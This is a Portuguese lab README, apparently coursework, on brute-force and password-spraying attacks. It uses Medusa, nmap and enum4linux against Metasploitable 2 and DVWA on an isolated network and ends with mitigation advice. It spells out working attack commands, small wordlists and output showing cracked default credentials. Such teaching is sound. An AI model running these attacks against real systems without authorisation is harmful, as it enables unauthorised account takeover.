# Projeto — Simulação de Ataques de Força Bruta com Kali + Medusa

> Ambiente controlado com Metasploitable 2 / DVWA — exercícios de brute force, password spraying e recomendações de mitigação.

## Índice

* [Visão geral](#visão-geral)
* [Objetivos](#objetivos)
* [Ambiente (pré-requisitos)](#ambiente-pré-requisitos)
* [Topologia de rede](#topologia-de-rede)
* [Passo a passo dos testes](#passo-a-passo-dos-testes)

  * [1) Reconhecimento - nmap](#1-reconhecimento---nmap)
  * [2) Força bruta em FTP (Medusa)](#2-força-bruta-em-ftp-medusa)
  * [3) Ataque a formulário web (DVWA) com Medusa](#3-ataque-a-formulário-web-dvwa-com-medusa)
  * [4) Enumeração SMB + Password Spraying](#4-enumeração-smb--password-spraying)
* [Wordlists / scripts usados](#wordlists--scripts-usados)
* [Resultados (exemplos de saída)](#resultados-exemplos-de-saída)
* [Recomendações de mitigação](#recomendações-de-mitigação)

* [Referências / notas sobre o material usado](#referências--notas-sobre-o-material-usado)

---

# Visão geral

Esse projeto demonstra, em um ambiente isolado, técnicas básicas de ataque de força bruta e password spraying usando o Kali Linux e a ferramenta **Medusa**, contra uma VM vulnerável (**Metasploitable 2**) e a aplicação **DVWA**. O objetivo é aprender ataques, gerar evidências e propor contramedidas. Conteúdo de suporte e saída exemplificativa foram retirados do arquivo de notas do projeto. 

# Objetivos

* Compreender ataques de força bruta em FTP, HTTP (formulários) e SMB. 
* Executar Medusa para automatizar tentativas de login. 
* Documentar processos, resultados e recomendações para mitigar esses vetores. 

# Ambiente (pré-requisitos)

* Host: máquina com VirtualBox.
* VMs:

  * **Kali Linux** (atacante).
  * **Metasploitable 2** (alvo vulnerável) — credencial padrão `msfadmin:msfadmin`. 
* Rede: configure as VMs em **Host-Only** (ou Internal Network) para isolamento.
* Ferramentas (no Kali): `nmap`, `medusa`, `enum4linux`, `enum4linux`, `ftp`, `curl`/`burpsuite` (opcional). 

# Topologia de rede

Exemplo:
Kali — 192.168.56.4
Metasploitable2 — 192.168.56.3
(Use seu `ifconfig`/`ip a` nas VMs para confirmar). 

---

# Passo a passo dos testes

## 1) Reconhecimento - nmap

Faça varreduras para identificar serviços abertos e versões:

```sh
nmap -v -sV -p 21,22,80,139,445 192.168.56.3
```

Exemplo (saída resumida encontrada nas notas):

* FTP: `vsftpd 2.3.4`
* HTTP: `Apache httpd 2.2.8`
* SMB: `Samba smbd 3.X - 4.X`
  (mais detalhes no arquivo de notas). 

Dica: varredura completa:

```sh
nmap -v 192.168.56.3
```

Isso ajuda a priorizar alvos para brute force. 

---

## 2) Força bruta em FTP (Medusa)

1. Crie listas de usuário e senha (ex.: `users.txt`, `pass.txt`):

```sh
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\nqwerty\nmsfadmin" > pass.txt
```

2. Execute Medusa contra FTP:

```sh
medusa -h 192.168.56.3 -U users.txt -P pass.txt -M ftp -t 6
```

* `-h`: alvo
* `-U`: arquivo de usuários
* `-P`: arquivo de senhas
* `-M ftp`: módulo FTP
* `-t`: threads concorrentes

Observação: no seu registro, Medusa encontrou credenciais válidas (por exemplo `msfadmin:msfadmin`) contra o FTP. 

---

## 3) Ataque a formulário web (DVWA) com Medusa

DVWA: `http://192.168.56.3/dvwa/login.php` — inspecione o formulário com DevTools para descobrir os nomes dos campos (`username`, `password`). 

Exemplo (tentativa):

```sh
medusa -h 192.168.56.3 -U users.txt -P pass.txt -M http \
  -m 'PAGE:/dvwa/login.php' \
  -m 'FORM:username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL:Login failed' -t 6
```

> Observação: dependendo da versão do Medusa e da sintaxe do módulo HTTP, a forma de passar os parâmetros pode variar — no arquivo de notas aparecem avisos de “Invalid method: PAGE/FORM” em algumas execuções (teste e ajuste conforme a versão instalada). 

Se o método `-m PAGE/FORM/FAIL` não for aceito, adapte usando `curl` em um script simples ou outra ferramenta (Hydra, Burp Intruder). 

---

## 4) Enumeração SMB + Password Spraying

1. Enumere usuários com `enum4linux`:

```sh
enum4linux -a 192.168.56.3 | tee enum4_output.txt
```

2. Monte `smb_users.txt` e `senhas_spray.txt`:

```sh
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

3. Execute Medusa para SMB NTLM:

```sh
medusa -h 192.168.56.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

No exemplo registrado, Medusa encontrou `msfadmin:msfadmin` e relatou `ADMIN$ - Access Allowed` para SMB. Isso demonstra sucesso do password spraying contra contas com senhas fracas. 

---

# Wordlists / scripts usados

* `users.txt`:

  ```
  user
  msfadmin
  admin
  root
  ```
* `pass.txt`:

  ```
  123456
  qwerty
  msfadmin
  ```
* `smb_users.txt` e `senhas_spray.txt` conforme seção SMB.

Dica: para trabalhos reais (autorizados), use wordlists maiores (rockyou.txt) e regras de mangling; em ambiente de teste, listas pequenas tornam o experimento mais rápido e didático. 

---

# Resultados (exemplos de saída)

Trechos de saída que mostram credenciais encontradas (exemplo do seu log):

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.3 User: admin Password: 123456 [SUCCESS]
ACCOUNT FOUND: [smbnt] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

Esses resultados foram capturados e documentados no arquivo de notas.

---

# Recomendações de mitigação

Para cada vetor identificado, recomendações práticas:

**FTP**

* Desativar FTP se não for necessário; preferir SFTP/FTPS.
* Proibir logins anônimos e aplicar políticas de senha fortes. 

**Web (formulários)**

* Implementar proteção contra brute force: bloqueio por IP/conta, CAPTCHAs, rate limiting.
* Usar hashing salgado para senhas no servidor e HTTPS para transporte. 

**SMB / AD**

* Implementar política de senhas fortes e MFA quando disponível.
* Habilitar auditing e detecção de tentativas de login anômalas; habilitar SMB signing onde possível. 

**Geral**

* Atualizar software e serviços (corrigir versões vulneráveis).
* Segmentar rede e reduzir superfície de ataque (apenas serviços essenciais expostos). 

---

# Referências / notas sobre o material usado

* Notas e saídas: documento `Santander Cibersegurança 2025.md` (fonte principal para este README). 
* Trechos de execução Medusa — logs de FTP/HTTP/SMB foram usados como exemplos.
